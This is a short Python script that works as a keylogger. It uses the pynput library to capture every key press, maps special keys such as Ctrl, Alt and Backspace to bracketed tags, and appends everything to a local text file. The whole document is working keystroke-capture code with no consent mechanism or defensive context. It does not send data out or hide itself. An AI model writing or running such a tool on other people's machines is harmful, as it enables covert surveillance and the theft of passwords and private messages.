from pynput.keyboard import Listener, Key

# Path to where log will be saved
log_file = "key_log.txt"

# Function to write the key press to log file
def on_press(key):
    try:
        # Log normal characters
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        # Handle special keys
        special_keys = {
            Key.space: " ",
            Key.enter: "\n",
            Key.tab: "\t", 
            Key.backspace: "[BACKSPACE]",
            Key.shift: "",
            Key.shift_r: "",
            Key.ctrl_l: "[CTRL]",
            Key.ctrl_r: "[CTRL]",
            Key.alt_l: "[ALT]",
            Key.alt_r: "[ALT]",
            Key.esc: "[ESC]",
        }

        with open(log_file, "a") as file:
            file.write(special_keys.get(key, f"[{key}]")) 

# Start listening to the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()